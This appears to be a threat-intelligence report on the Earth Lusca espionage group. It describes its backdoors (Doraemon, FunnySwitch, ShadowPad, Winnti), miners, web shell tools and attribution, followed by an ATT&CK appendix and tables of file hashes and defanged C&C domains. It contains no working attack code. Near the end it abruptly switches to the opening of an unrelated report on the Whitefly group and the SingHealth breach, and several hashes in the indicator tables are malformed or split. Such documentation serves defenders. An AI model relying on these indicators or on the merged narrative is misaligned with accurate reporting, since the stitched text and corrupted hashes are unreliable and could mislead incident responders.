An example of the shellcode inside the BMP image file For Earth Lusca’s more recent samples, the threat actor also started to use the “MITRE – Hijack Execution Flow: DLL Side-Loading” technique to leverage valid code-signed executions, for which the following files are used: e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46 7e35078106bd59b739b1d1fb6ad16d56c3adaf9f10d2e206a1b9b23d64b25cd0 a72ea60be2adb8f15bbec86910dc1c1f41abe888fb87b1f3f902dcaa85e774f6 4b8d15492687e46f939924a3a44b0f9b276229598433fb1380f8b6f46221416d Doraemon While this backdoor is already quite old, it is rarely discussed by the general public. Recently mentioned by ESET in their SideWalk report, we first encountered Doraemon around 2016 in incidents involving Korean and Taiwanese online gaming companies.
It then disappeared from view for about three years until we encountered it again in 2020. The naming of the backdoor comes from the fact that it contains an original DLL filename Doraemon.dll, and the PDB strings “D:\资料\C++\Doraemon\x64\Release\mem_dll.pdb” contained in the project name from an early version circa 2016. The name is originally from a Japanese manga series.
The backdoor usually contains two C&C settings, the first C&C setting being a primary one that is IP or DNS, while the second one is a public website URL that contains encrypted or clear text C&C IP addresses, so even if the first IP/C&Cs are blocked, the threat actor still has a way to achieve persistence. Figure 17. Encrypted and clear text C&C IP addresses It’s not clear how Earth Lusca delivered this backdoor to victims. Nevertheless, we found two samples connected to C&C domains that belong to Earth Lusca’s infrastructure.
FunnySwitch FunnySwitch is a .NET Framework backdoor that usually starts with the “MITRE – Hijack Execution Flow: DLL Search Order Hijacking” technique and executes inside a legal process that was mentioned and analyzed by Positive Technologies in 2020. Most known samples are placed in C:\Windows\System32\oci.dll, which starts with msdtc.exe. However, we recently found new samples that leverage the signed McAfee executable file (e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46). These new DLL files both contain a unique PDB string: E:\VS2019_Project\while_dll_ms\whilte\x64\Release\macoffe.pdb We have found and checked two similar DLL files, with one supporting payload encryption, and another that does not. Figure 18.
The decryption function The time stamp is only slightly different — around 9 days — but the entry function has changed, which means development is very active and the backdoor is rapidly being evolved. Figure 19. Bindiff view of the entry function; 82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732 (right) and 6f258841a10be2543878dc8479098f8fe1752f4cbd7c29d6854f5329d0960e87 (left) ShadowPad ShadowPad is a malware family that was discovered in 2017 and eventually used in high-profile supply chain attacks. While it was initially used solely by APT41, it started being shared among multiple Chinese threat actors in 2019.
In the case of Earth Lusca, the malware has the same features, but they added an extra layer of obfuscation, making it very different from the Shadowpad samples used by other groups. In this case, the ShadowPad samples are composed of three components: a valid code signed executable, a DLL loader, and an encrypted payload. The obfuscation technique used by ShadowPad has previously been described: a function is called before each instruction, which will redirect the code flow to the next instruction, making it very difficult to follow. In addition, some useless comparisons are added to overload the code.
The DLL loader is obfuscated. Its role is to search and load the payload file, which is obfuscated in the same manner as the DLL file. If the payload file is found, its code is copied to the registry and the file is deleted. The next time it runs, the payload will be loaded from the registry. This way, it is not possible to recover the final payload using only the DLL loader and without the registry content. Some of the decrypted configurations we found contained the “mm_telecom” keyword, which might indicate a possible target.
We have seen ShadowPad samples dropped by Cobalt Strike infections distributed by Earth Lusca to its victims. We observed the same behavior for ShadowPad C&C servers that move rapidly. Date IP ISP May 18, 2021 139.180.135[.]175 Vultr – German Jul 20, 2021 207.148.76[.]26 Vultr – Singapore Aug 31, 2021 149.28.156[.]173 Vultr – Singapore Sep 7, 2021 156.240.107[.]248 UDC – Hong Kong Table 4. Resolve History for 6czumi0fbg.symantecupd[.]com Winnti Winnti for Linux is a copy of the open-source userland rootkit Azazel with some modifications that was researched and published in detail in 2019.
Designed to work with the TreadStone controller, the backdoor existed under the radar of security vendors for years because it was installed on Linux machines that lacked security solutions — either due to a lack of options or because the machine’s owner wanted to reduce performance hits in a production environment. Miners We also found several miner programs, installation scripts, and machine lists in Earth Lusca’s GitHub repository, the primary cryptocurrency target being Monero (XMR). Figure 20.
The shell script to launch the cryptocurrency miner by.bat – XMR installation Scripts ok.txt – Victim machine lists pwm.exe – XMR Miner wmi.vbs – WMI EXEC Vbscript Further analysis shows that the threat actors install the miner on the victim’s machine to earn money. At first glance, the revenue earned from the mining activities seem low. However, it also shows the victim’s Active Directory being compromised. Figure 21.
The cryptocurrency miner’s dashboard Others Based on the information we found in the GitHub repository, we know that Earth Lusca uses multiple web shells that are written in several languages such as JSP, PHP, Perl, C# and ASPX. Despite their differences, these web shells are all designed to get the job done. The following subsections will briefly cover a couple of web shell management tools that the group uses. AntSword AntSword is a successor of the China Chopper web shell that integrates more features compared to other web shell management tools.
Perhaps its unique selling point is its plugin store, where a user can enhance its functions via additional plugins. Figure 22. AntSword’s plugin store Behinder Behinder is a web shell management toolkit that encrypts traffic — making it stand out from other web shell management tools, Encrypted payloads are more difficult for web application firewalls or intrusion prevention systems to discover. Figure 23.The Behinder UI Attribution In January 2020, ESET reported a new campaign targeting universities in Hong Kong with both Winnti and a new ShadowPad variant.
On May 21, 2020, few domains related to the same cluster of infrastructure used in this campaign were listed as the indicators in an FBI alert mentioning that nationstate threat actors were targeting US organizations conducting Covid-19 research. Positive Technologies released a report sharing the analysis of a new malware called FunnySwitch, which possibly originated from the same developers of the Crosswalk malware: the C&C domains of FunnySwitch could connect to the infrastructure of the same campaign. Another report released by Dr.WEB in March 2021 identified another malware called Spyder, which also used the same associated C&C infrastructure.
In April 2021, the NTT Group published a report of a campaign that deployed Cobalt Strike and Acunitex on compromised GlassFish servers to perform targeted attacks. The report addressed the activity overlaps with aforementioned ESET and Dr.WEB’s reports. A few months later, in July 2021, Avast reported that the website of a Mongolian certification authority was compromised to distribute Cobalt Strike binaries associated with the indicators described in the NTT Group’s report. Recorded Future reported the same cluster of activity later on and gave a temporary name to this campaign (TAG-22).
In July 2021, we published a report on a new malware called BIOPASS RAT. The malware was loaded by loaders that have the same PDB string reported in both the NTT Group and Avast’s reports. More recently, PwC published an extensive analysis of the ShadowPad variant (32 bit version) that Earth Lusca used. Figure 24. Research and reports related to Earth Lusca The earlier research done on these activities initially attributed it to the Winnti Group since the malware used in the campaigns included Winnti and ShadowPad (reported to be associated with the Winnti Group).
As more details emerged, however, it became clear that the TTP and the infrastructure differ from those used by any subcluster under the Winnti umbrella. More recent reports consider it to be another cluster of activities under the name TAG-22 or Fishmonger. We decided to separate the cluster as an independent campaign and named it Earth Lusca. The term Winnti has evolved since it first hit public consciousness in 2013.
While it was initially designated as both a tool and its associated threat actor, the research community has begun to consider the term “Winnti” as one that no longer refers to a single threat actor, but encompasses several different groups originating from the same country and possibly sharing parts of their code, tools and TTP. We can conclude with medium confidence that Earth Lusca is part of the Winnti cluster, but we prefer to state the facts and consider it as a single threat actor.
Conclusion Earth Lusca is a cyberespionage campaign that targets high value organizations around the world via spear phishing or watering hole attacks using tried and true social engineering techniques. One of their motivations is financial gain, as evidenced by their targeting of gambling and cryptocurrency companies. Furthermore, the group also targets public-facing servers through the exploitation of known vulnerabilities in servers that are running out-of-date versions of applications. Earth Lusca also used vulnerability scanning tools to discover possible vulnerabilities inside the websites of targeted victims.
The infection vectors used by the group shows the importance of applying security best practices such as proper vetting of emails and websites being visited, as well as constantly updating software to their latest security iterations to minimize the chances of vulnerability exploitation.
Furthermore, advanced and versatile security technologies such as Trend Micro XDR can help defend organizations from threat actors such as Earth Lusca by collecting and correlating activity data across multiple vectors — from emails and endpoints to servers, cloud workloads, and networks — enabling a layer of security detection and investigation that cannot be matched by traditional security solutions. Appendix A.
MITRE ATT&CK Reconnaissance Resource Development Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Active Scanning Acquire Infrastructure Drive-by Compromise Command and Scripting Interpreter Account Manipulation Abuse Elevation Control Mechanism Abuse Elevation Control Mechanism Brute Force Account Discovery Exploitation of Remote Services Archive Collected Data Application Layer Protocol Exfiltration Over C2 Channel Gather Victim Host Information Compromise Accounts Exploit PublicFacing Application Deploy Container BITS Jobs Create or Modify System Process BITS Jobs Credentials from Password Stores File and Directory Discovery Internal Spearphishing Data from Local System Data Obfuscation Transfer Data to Cloud Account Gather Victim Identity Information Compromise Infrastructure External Remote Services Scheduled Task/Job Create Account Hijack Execution Flow Deobfuscate/Decode Files or Information OS Credential Dumping Network Service Scanning Data from Network Shared Drive Encrypted Channel Gather Victim Network Information Obtain Capabilities Phishing System Services Create or Modify System Process Scheduled Task/Job Deploy Container Steal Application Access Token Network Share Discovery Email Collection NonStandard Port Gather Victim Org Information Stage Capabilities Supply Chain Compromise Windows Management Instrumentation External Remote Services Valid Accounts Hide Artifacts Unsecured Credentials Query Registry Screen Capture Protocol Tunneling Phishing for Information Valid Accounts Hijack Execution Flow Hijack Execution Flow Remote System Discovery Proxy Search Closed Sources Scheduled Task/Job Impair Defenses System Network Connections Discovery Remote Access Software Search Open Technical Databases Valid Accounts Modify Registry Search Open Websites/Domains Signed Binary Proxy Execution Search VictimOwned Websites Valid Accounts Reconnaissance Active Scanning Gather Victim Host Information Gather Victim Identity Information Gather Victim Network Information Gather Victim Org Information Phishing for Information Search Closed Sources Search Open Technical Databases Search Open Websites/Domains Search Victim-Owned Websites Resource Development Acquire Infrastructure Compromise Accounts Compromise Infrastructure Obtain Capabilities Stage Capabilities Initial Access Drive-by Compromise Exploit Public-Facing Application External Remote Services Phishing Supply Chain Compromise Valid Accounts Execution Command and Scripting Interpreter Deploy Container Scheduled Task/Job System Services Windows Management Instrumentation Persistence Account Manipulation BITS Jobs Create Account Create or Modify System Process External Remote Services Hijack Execution Flow Scheduled Task/Job Valid Accounts Privilege Escalation Abuse Elevation Control Mechanism Create or Modify System Process Hijack Execution Flow Scheduled Task/Job Valid Accounts Defense Evasion Abuse Elevation Control Mechanism BITS Jobs Deobfuscate/Decode Files or Information Deploy Container Hide Artifacts Hijack Execution Flow Impair Defenses Modify Registry Signed Binary Proxy Execution Valid Accounts Credential Access Brute Force Credentials from Password Stores OS Credential Dumping Steal Application Access Token Unsecured Credentials Discovery Account Discovery File and Directory Discovery Network Service Scanning Network Share Discovery Query Registry Remote System Discovery System Network Connections Discovery Lateral Movement Exploitation of Remote Services Internal Spearphishing Collection Archive Collected Data Data from Local System Data from Network Shared Drive Email Collection Screen Capture Command and Control Application Layer Protocol Data Obfuscation Encrypted Channel Non-Standard Port Protocol Tunneling Proxy Remote Access Software Exfiltration Exfiltration Over C2 Channel Transfer Data to Cloud Account Appendix B.
Indicators of Compromise Doraemon Files SHA256 Note Detection TrendX 2d3699607194d1a2a6c1eeeb5d0e5e5e385b78d94d5053e38e3c1908c5ced1c6 Doraemon backdoor Backdoor.Win64.DORAEMON.A Troj.Win32.TRX.XXP E50FFF03695aa15baeef978b99e63a406fa06a1197f6f762047f9729f17bb49b72ead6477 Doraemon backdoor Backdoor.Win64.DORAEMON.A N/A C&C server DNS server dsyu.livehost[.]live dust.dnslookup[.]services http://www.akiyaku[.]jp/images/images/mm.html http://www.n[.]co/1/1/1/1 Cobalt Strike Files SHA256 Note Detection TrendX 46aedd46f54967c9c9dbfabc04237a4808981086d94c5fd5482a5d42e34d8b1f Cobalt Strike dropper Trojan.Win64.COBEACON.SVH Trojan.Win64.COBEACON.SVH d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca Cobalt Strike dropper Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 6a4e32229e5ca41e8eca99cefe5beef3e3621c2199f8844b4d218c14b5481534 Cobalt Strike Trojan.Win32.COBEACON.BU N/A 8be8a6f8fe7c182a5017040aa8c8cfc9cefbcf8f3d1be932c7e710101c34d57e Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 c6a027d3c7e4734e4cf62741f7fb58f225dcb5ad36af75c6e19a4e3d870294e8 Cobalt Strike Trojan.Win32.COBEACON.BU N/A 28c9a18366475de99f5959750e2f3c526668bee78af3419c646a514eecaeebbd Cobalt Strike Trojan.Win64.COBALTSTRIKE.I Ransom.Win32.TRX.XXPE50FFF051 d36deb308bd61d31d919d4d77f5c12ac108042da9b9301678859229e2fc891e1 Cobalt Strike Trojan.Win64.COBEACON.SVH TROJ.Win32.TRX.XXPE50FFF051 44fa4d2db0b68a0638e0d28594fd446ef2615755c9fc001e7e2e80feea3052ae Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 93956d3ebb0614ff5c959bed7edaf4f3f41df4538468de0f84f3e27b8e3bde49 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 5e9d0dc03f725337ec3e2a426d982563ff2ec0232c829325599e721d4307bb9a Cobalt Strike Trojan.Win32.COBEACON.BU N/A 586dc1eb6e9f910e3cba04f80ad6ce61abfeeb5a670d129e3fd3f45c124383 Cobalt Strike Trojan.Win32.COBEACON.BU N/A 523f93f09b7188afd3c780bf81fe7fd30094c50e324431fd913076c46ccd722ba2 Cobalt Strike Trojan.Win32.COBEACON.BU N/A 2fe174c17383598025c3af714cbd4807ed5eac3ba17b1ac444794de6650bc188 Cobalt Strike Trojan.Win32.COBALSTRIKE.F Troj.Win32.TRX.XXPE50FFF051 afead6dc93f0a64c68b091420d9b884550418e9322109d483eb625e7694f8105 Cobalt Strike Trojan.Win32.COBALTSTRIKE.E Troj.Win32.TRX.XXPE50FFF051 8559fe618ca3841b9f541a034393cfe8b454751fb99791c4c6de1b20ac08d803 Cobalt Strike Trojan.Win32.COBALTSTRIKE.E Troj.Win32.TRX.XXPE50FFF051 4814e8baf52df7a17af3d88aba38d7bce4aed753a05b3d64478d4efedccc6625 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 2409047d04b8d3317710eca9e5d97e56a5210b07781903b2f2dc29358c1d4c56 Cobalt Strike Trojan.Win64.COBALTSTRIKE.I TROJ.Win32.TRX.XXPE50FFF051 171403ea31eb670cc240305dfda802f06f01339587ae02384f9d3b01720432c7 Cobalt Strike Trojan.Win64.COBALTSTRIKE.I N/A 2e8652950932b5f3e8901b125d4198b2cae3abde50dcf072e77c788c0f76b43a Cobalt Strike Trojan.Win64.COBALTSTRIKE.I Troj.Win32.TRX.XXPE50FFF051 9d514cdf1db58f7eef40a7bea52c9e646b5db0f81ed2809caed9a68b97665d99 Cobalt Strike Trojan.Win64.COBALTSTRIKE.I Troj.Win32.TRX.XXPE50FFF051 66667b603352399069facd78a6d8903f40b5c6e6cfaafb924873b0e590f2a696 Cobalt Strike Trojan.Win32.COBALTSTRIKE.F Troj.Win32.TRX.XXPE50FFF051 9a73700d5c704c884cb9c905b4e4dfdf299ade57eba52801ae1d076137cff552 Cobalt Strike Trojan.Win32.COBALTSTRIKE.F N/A 2ca332d56d0e032be324b6ed2c014f4edf9cfa328bc5ac61e5434c9ddf7c17b6 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 7f40b8c0d45d7290fb55552e7da28bec2efa8797ab13662f62bb72c74cb7dc01 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 89c0b2036ce8d1d91f6d8b8171219aafcd6237c811770fa16edf922cedfecc54 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 97b2f7ef4132f27c615cec5fb75f8849b4576f5d6d1d1111074397596c946b8d Cobalt Strike Trojan.Win64.COBALTSTRIKE.H N/A aeb4a8f6115bbba85513ded12a9c31a00e4e3a60ae501fbbf43510782289fe92 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 d9cfc3b7544927a2d5d56f0d4767b88b83a91616aa3b0a4a1846fd7881a4e0f9 Cobalt Strike Trojan.Win64.COBALTSTRIKE.H Troj.Win32.TRX.XXPE50FFF051 7a0b6ab149abd2c053278acda610ed2a2a07a8e70d8897fe34eaebaa3fffcfb8 Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A abf59d67fcafa42fb5d4f562870af2aa092c678673b6c404b5afe2eadb18229d Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A 318dbf3cfca46574c16f5e20828b2a878665a8209120efd9e611d8cf98954afa Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A 161afaaa83bc5202af3e4f7a083fa3f888d59f381f7a3e06176dc8e048fe066f Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A c7a9eb1c6d1bbea60759fa6e4396254d897922bc86c6c1d1b520f0a2357184d6 Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A f819177fb5f6489f3cf0ff402bbf5d4678c2b703e09c1e26ac00fb08376edb13 Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A 98356e59608a77921d0f6f2ac95ab58302d69e9333447aab91512e0976c8b368 Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A 4347bd2231fcda57da6201dde35818817fcad0c825170057ea7d07141ae95ea3 Cobalt Strike PowerShell loader Trojan.PS1.COBALT STRIKE.C N/A 05c2222d3660b49eb98eb07e322ce1efba0b38226e882a3cf3ce3b6374054de4 Cobalt Strike PowerShell loader Trojan.PS1.COBALTSTRIKE.C N/A C&C server DNS server coivo2xo.livehost[.]live www.getdns[.]gd cookiestest[.]ml qqfinance[.]ml lzfhome[.]xyz ybk47i6z8q.wikimedia[.]vip w01grw7gs.ithome[.]house Winnti Files SHA256 Note Detection TrendX e46fcaac5f65a410040010c338f2fc02d9ac0327344acab8ce5152529312c4ae Winnti backdoor Backdoor.Linux.WINNTI.D Troj.ELF.TRX.XXELFC1DFF012 66923293d6cd7169d843e26aade13896ce77214fbe256bd925d7b96187b2aa48 Winnti backdoor Backdoor.Linux.WINNTI.D Troj.ELF.TRX.XXELFC1DFF012 11e02158d456bb43c7d8abfc34cf46ad0eccf7c93959ac90df24f52ce6d8962c Winnti backdoor Backdoor.Linux.WINNTI.E Troj.ELF.TRX.XXELFC1DFF012 88cc62d5eeb21590da9b67b25ba588c2975a45289a829ab27b820eaa2ff88ea2 Winnti backdoor Backdoor.Linux.WINNTI.E Troj.ELF.TRX.XXELFC1DFF012 367021e9ec138b8283fa83d5258bb06022f08aa129a9c6537203238b1bce538a Winnti backdoor Backdoor.Linux.WINNTI.E Troj.ELF.TRX.XXELFC1DFF012 96cb323da444f9c65043cc69c4d85f9c72d6c9d47c2cdcfa8caec455a9b9357e Winnti backdoor Backdoor.Linux.WINNTI.E Troj.ELF.TRX.XXELFC1DFF012 C&C server DNS server lmogv.dnslookup[.]services smtp.nslookup[.]club 3VnwTuq9s.ithome[.]house ShadowPad Files SHA256 Note Detection TrendX 92d224568617795959723e2cc22d6e244d225c2210758f08965d5844f24feed8 ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGX N/A 196507c6dc3541c131085f034609ba533fbafc54bee0477dab9c7bc214900e30 ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGY TROJ.Win32.TRX.XXPE50FFF051 6de4eb04725383af828d319f6253f65b939727df26b35ca424b92e11ebb7110d ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGY TROJ.Win32.TRX.XXPE50FFF051 54538baa089bdd0aecc54bd3e8c3bdbb5dbf2eae18ed3178c8015b0d150bcba0 ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGZ edee57d418cbde1a7ab44edfbc2c4f99dbac107a823b4f4a5ccace25d0d2b108 ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGY TROJ.Win32.TRX.XXPE50FFF051 dbb32cb933b6bb25e499185d6db71386a4b5709500d2da92d377171b7ff43294 ShadowPad backdoor Trojan.win32.SHADOWPAD.CGX TROJ.Win32.TRX.XXPE50FFF051 8065da4300e12e95b45e64ff8493d9401db11667460001241685807db2e29c3 ShadowPadbackdoor Backdoor.Win32.SHADOWPAD.CGX.enc N/A 1ea61be85e74f74a73b366283f27ec602456fae02510ff182b45d4ffb69ee6aae ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGX.enc N/A 94295f90dc5fb03fc47e8e2144774f103b8a29d2ada101173f193cd0c8a38f3d ShadowPad backdoor Backdoor.Win32.SHADOWPAD.CGY.enc N/A C&C server DNS server 5s2zm07ao.wikimedia[.]vip r1d3wg7xofs.livehost[.]live 6czumi0fbg.symantecupd[.]com 1dfpi2d8kx.wikimedia[.]vip 5NcNt6z1.wikimedia[.]vip FunnySwitch Files SHA256 Note Detection TrendX 3fe1b293d8a50db95d50e6eec9773e9c2e552a0122fe4428de8d31061092d330 FunnySwitch backdoor Backdoor.Win32.FUNNYSWITCH.A TROJ.Win32.TRX.XXPE50FFF052 06a5413e0ffadc4d4fcaf4782ef81d3e1b7a860c580bbe37e9c0e9940e68161e FunnySwitch backdoor Backdoor.Win32.FUNNYSWITCH.A TROJ.Win32.TRX.XXPE50FFF052 f37c19b86a5b8b6c71d7350894506c7278864f7f968d0593a5e477c728b91372 FunnySwitch backdoor Backdoor.Win32.FUNNYSWITCH.A TROJ.Win32.TRX.XXPE50FFF052 23dfce597a6afef4a1fffd0e7cf89eba31f964f3eabcec1545317efeb25082ed FunnySwitch backdoor Backdoor.Win64.FUNNYSWITCH.A TROJ.Win32.TRX.XXPE50FFF051 6f258841a10be2543878dc8479098f8fe17 FunnySwitch backdoor Backdoor.Win64.FUNNYSWITCH.B N/A 52f4cbd7c29d6854f5329d0960e87 C&C server DNS server 7hln9yr3y6.symantecupd[.]com bm2l41risv.livehost[.]live o56n1tosy.livehost[.]live mztfki9x.wikimedia[.]vip ok3x377v3f.symantecupd[.]com Web Shell Files SHA256 Note Detection TrendX d7ecfd61915972f1d74f51039fc97a3b2d855a13c70a052ebb1bc80e78dd338 C# Webshell Backdoor.ASP.WEBSHELL.QUWMLAR N/A d7078956cb7be6e7e6751ec66ff0e1c428a67d8ab6be03f9ed6fbcede866c39e JSP Webshell Backdoor.Java.WEBSHELL.SBJKUG N/A cd335698d4c2422e924fdc67dcceb2037c954d875f03aa298d9fb5f0db851548 JSP Behinder Webshell Backdoor.Java.WEBSHELL.SBJKUG N/A 4d0c611bece3baa5d1502b50779be653e25c0ac8679111628d32686002743600 Gamma Webshell Backdoor.JS.WEBSHELL.KEQW N/A 60b4d23d41707ef7fc09e01f1864cb0d8c8a4f5d180fc97e559356780efcd54b PHP Webshell Backdoor.PHP.WEBSHELL.SBJKRW N/A 7aaf33bb2979262590932dcfd6902d09a3c0045d906570a15123fa12f8656171 PHP Webshell Backdoor.PHP.WEBSHELL.SBJKXRW N/A ececbed665469514ed8583a4928f9a524f00a9b9c3c042015717ea22614398e4 PHP Webshell Backdoor.PHP.WEBSHELL.SBJKXRW N/A b081db87c75b6aea905a62532cb40bc21bc7acebb7a0c6c601d993c76a8c6ce1 PHP Database Webshell (legitimate abused tool) HS_DBShell.A N/A bb45df12b63e5b133e6cb622b174ad68bc95a5bce15f98eede56597d38401b27 PHP Webshell Backdoor.PHP.WEBSHELL.SBJKXRW N/A 566152a2d86186dcfb28856b4ed0dfdb60e355d93ab693f7931201f75868fff0 PHP Web Database Manage (legitimate abused tool) HS_Adminer.A N/A e2e969efc2d688e01a9aa32d50176374af811a3324651fb03b7b848e06e0b677 PHP Web Database Manage (legitimate abused tool) HS_Adminer.B N/A c0725296e8ab3d9d3c932ecf45588f39ef8fa7a310d31bfd05a061194f8eeb1e PHP Web Database Dump Backdoor.PHP.DBSHELL.A N/A b151285b331ab2450e2f7387590b29348ebb6f34391d4b10958faea715027795 PHP Web Database Dump Backdoor.PHP.DBSHELL.A N/A Tools Files SHA256 Note Detection TrendX b5577248f532c2939db023d279d625fa4c01e9ee68441fe90046d2b6e79ac1d7 Tool - DrityCow HackTool.Linux.DirtyCow.A N/A 9ee8b7ab27830bf615ce82f4b4930d10b735837842dfdd1d7ed25a460f76b863 Tool - List Login RDP Users HackTool.PS1.ListRDP.A N/A 7d036e80f607710376a881653d7c26b4df Tool – Port Scan HackTool.Python.PScan.A N/A ba87e45dbfc69bcb913dbc01d67ef2de4d7ea590f1f27f6ceae6de40802f632eff7028cdb51c03b5f799da08abf80d Tool – WMI Exec PUA.VBS.WmiExec.A N/A 9d2d265c0761366f2d8063bf2aed877fe9ada98008cc777919f75866b57febb8 Tool – Get Current IP HackTool.BAT.IPRanges.A N/A c47be279811d4213298dc925ece7d87e9768a90705d4f8a3413d6e962d9fe6bc Tool - MiniPenguin HackTool.SH.MiniPenguin.A N/A b16ee7b7cc4fbb390c9ee7a0be1760743b521514d1100dc20cd3972de7d5252d Tool - libprocesshider HackTool.Linux.ProcHide.B N/A 622c797683ef9f83cf1f33367e5dc9b61cfd577f4edc674d1ea6d5b310558097 Tool - SMBGhost HackTool.Win64.SMBGhost.A N/A 3ea02150e161a7c10e845e1ca7504fe399f8f482603490b38a41e748b6580d02 Tool - SMBGhost HackTool.Win64.SMBGhost.A N/A a49923faa7d2a2a5e191a0aeca3ffd484655be1fdaaef81b3a85f28ce65859ae Tool – Juicy-Potato HackTool.Win32.JuicyPotato.I Ransom.Win32.TRX.XXPE50FFF051 c4071807b1d03b9db79f1281785d89700c88008ec544b17488e2132ed89a32ac Tool – ShellCode Loader Trojan.Win32.COBALTSTRIKE.F Troj.Win32.TRX.XXPE50FFF052 d1871f94304fdd7fea81f9a6a06908eaf8744bc784e698eb36a352f9e2b2049f Tool – Reversed Shell HackTool.Python.RevShell.A N/A 8d841149791b51f226249d0e5459f9b97f796be5a4e10ddc38eafc393288a7f4 Tool – Bash Reversed Shell HackTool.SH.RevShell.A N/A 2e9fbdcb3b13bd05cf9f35125efb1ca9e28d9afba8d9ae33e471075b0cafb16f Tool – ShellCode /bin/sh HackTool.Linux.GetShell.A Troj.ELF.TRX.XXELFC1DFF012 0025f9eaa43f5bb04b5c1f751334b8fec1024c2cf04f8124d6051ab1d1ebf448 Tool – HUC Port Banner Scanner V1.2 PUA.Win32.PortBanner.A N/A c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e Tool – NetBIOS scanner HackkTool.Win32.NbtScan.ZAIC N/A 2951af1fbf080341f977c7f8fd9916a42ad1f3d25fe7175def598600d946898e Tool - Fastscan HackTool.Win32.FastScan.A N/A b77c08892dd3fe6a938201b56236130f487b6c0fcf132a73b9bfa2baf0b45c46 Tool - Fastscan HackTool.Win64.FastScan.A N/A a76eaabc4e8ba5d6b3747825a9fbc286d44d3981ac521119902d64ae2fdcc4b7 Tool - EarthWorm HackTool.Win32.EarthWorm.B N/A 28332bdbfaeb8333dad5ada3c10819a1a015db9106d5e8a74beaaf03797511aa Tool – FRP Client HackTool.Win64.FRPC.C N/A 9cbcc08529dad8f0aae689dbacffa34b5c4895d49cf68a81c785f578482598a7 Tool - wtmpclean HackTool.Linux.WTm pClean.A N/A 9042e5a9ce45e4288f1396ff8e3ba27e16b500d431f8b2da1baba3c35b7782ba Tool - Megacmd PUA.Win64.MegaCMD.A N/A f1a3cff4428b86501abff58d98a740ad60388ea8588190ee169d956544b4d4ad Tool - BrowserGhost HackTool.MSIL.BrowserGhost.A N/A XMR Miner Files SHA256 Note Detection TrendX 625a6ba45d06b3387b50802d3eac280bb854327348b3a3fe4863cd0bd8a69a55 XMR MIner PUA.Linux.CyrptoMiner.AD Troj.ELF.TRX.XXELFC1DFF012 21cf3727a9e58f346bcdf039ad23ca8838dae902d0596726332f5815672d22e7 XMR Miner PUA.Linux.CryptoMiner.AD Troj.ELF.TRX.XXELFC1DFF012 949aa21dcf474003f06735cacdc9938bed366c64fde6ced58a3336b007c0bb7b XMR Miner PUA.Win64.CryptoMiner.CFI Troj.Win32.TRX.XXPE50FFF051 TREND MICROTM RESEARCH Trend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.
Trend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threats techniques. We continually work to anticipate new threats and deliver thought-provoking research. www.trendmicro.com
Group behind the SingHealth breach is also responsible for a string of other attacks in the region. In July 2018, an attack on Singapore’s largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information.
Whitefly compromises its victims using custom malware alongside open-source hacking tools and living off the land tactics, such as malicious PowerShell scripts.
"#Whitefly, the group behind the SingHealth breach, is also responsible for a string of other attacks in Singapore https://symc.ly/2X1RALf" CLICK TO TWEET Whitefly’s targets From mid-2017 to mid-2018, Whitefly launched targeted attacks against multiple organizations. While most of these organizations were based in Singapore, some were multinational organizations with a presence in Singapore.
To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors.
How Whitefly compromises its victims Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image. These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim. Given the nature of disguise, it’s highly likely that they are sent to the victim using spear-phishing emails.
